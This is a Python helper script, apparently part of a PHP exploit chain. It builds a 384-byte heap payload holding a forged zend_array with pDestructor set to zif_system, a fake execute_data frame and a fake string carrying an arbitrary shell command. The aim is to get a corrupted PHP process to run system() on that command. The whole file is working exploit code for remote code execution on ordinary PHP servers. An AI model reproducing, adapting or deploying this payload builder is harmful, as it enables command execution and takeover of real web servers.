#!/usr/bin/env python3
# Vendored from de0/ so the pure chain is self-contained.
"""Build the 384-byte `ht` value for the display_errors=Off fake-ref chain.

The value starts with a fake zend_array whose pDestructor is zif_system; the
fake execute_data lives at S+0x20 (arData), and the argument string at
S+0x80.  This is the same layout used by the display_errors=On chain, padded
to 384 bytes so the B's heap shape (bin-448) stays the same as the
diagnostic run.

usage:
  python3 mk_ht.py HT_ADDR ZIF_ADDR CMD OUT
"""
from __future__ import annotations

import struct
import sys


def build(htdata: int, zif: int, cmd: bytes, size: int = 384) -> bytes:
    ht = bytearray(b"\x00" * size)
    # fake HashTable at S
    struct.pack_into("<II", ht, 0x00, 1, 7)              # gc: rc=1, IS_ARRAY
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)  # flags, nTableMask
    struct.pack_into("<Q", ht, 0x10, htdata + 0x20)      # arData
    struct.pack_into("<II", ht, 0x18, 1, 1)              # nNumUsed/nNumOfElements
    struct.pack_into("<II", ht, 0x20, 8, 0)              # nTableSize/pointer
    struct.pack_into("<Q", ht, 0x28, 0)                  # nNextFreeElement
    struct.pack_into("<Q", ht, 0x30, zif)                # pDestructor = zif_system
    # fake execute_data at E = S+0x20 (also the first bucket zval)
    E = 0x20
    struct.pack_into("<Q", ht, E + 0x00, 0)              # opline
    struct.pack_into("<Q", ht, E + 0x08, 0)              # call
    struct.pack_into("<Q", ht, E + 0x10, zif)            # return_value
    struct.pack_into("<Q", ht, E + 0x18, 0)              # func
    struct.pack_into("<Q", ht, E + 0x20, 0)              # This.value
    struct.pack_into("<I", ht, E + 0x28, 0)              # This.u1.type_info
    struct.pack_into("<I", ht, E + 0x2C, 1)              # num_args = 1
    struct.pack_into("<Q", ht, E + 0x30, 0)              # prev_execute_data
    struct.pack_into("<Q", ht, E + 0x38, 0)              # symbol_table
    struct.pack_into("<I", ht, E + 0x40, 0)              # call_info
    struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)  # arg1 value
    struct.pack_into("<I", ht, E + 0x58, 6)              # arg1 IS_STRING
    # fake zend_string at S+0x80
    struct.pack_into("<II", ht, 0x80, 1, 0x106)          # gc rc=1, IS_STRING
    struct.pack_into("<Q", ht, 0x88, 0)                  # h
    struct.pack_into("<Q", ht, 0x90, len(cmd))           # len
    ht[0x98:0x98 + len(cmd)] = cmd
    ht[0x98 + len(cmd)] = 0
    return bytes(ht)


def main() -> int:
    if len(sys.argv) < 5:
        print(__doc__, file=sys.stderr)
        return 2
    htdata = int(sys.argv[1], 0)
    zif = int(sys.argv[2], 0)
    cmd = sys.argv[3].encode()
    out = sys.argv[4]
    if len(cmd) > 0x160 - 0x98:
        print("command too long for the 384-byte carrier", file=sys.stderr)
        return 2
    with open(out, "wb") as fh:
        fh.write(build(htdata, zif, cmd))
    print("ht %s S=%#x zif=%#x cmd=%r" % (out, htdata, zif, cmd))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
